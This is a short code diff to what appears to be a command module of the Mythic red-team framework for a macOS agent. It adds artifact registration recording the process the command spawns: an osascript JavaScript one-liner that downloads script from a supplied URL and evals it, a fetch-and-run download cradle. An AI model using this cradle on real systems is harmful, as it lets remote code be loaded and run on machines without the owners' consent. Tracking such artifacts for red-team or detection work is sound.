@@ -1,5 +1,6 @@
 from CommandBase import *
 import json
+from MythicResponseRPC import *
 
 
 class SpawnDownloadCradleArguments(TaskArguments):
@@ -40,6 +41,10 @@ class SpawnDownloadCradleCommand(CommandBase):
     argument_class = SpawnDownloadCradleArguments
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
+        resp = await MythicResponseRPC(task).register_artifact(
+            artifact_instance="/usr/bin/osascript -l JavaScript -e \"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString('{}')),$.NSUTF8StringEncoding)));\"".format(task.args.get_arg("url")),
+            artifact_type="Process Create",
+        )
         return task
 
     async def process_response(self, response: AgentResponse):
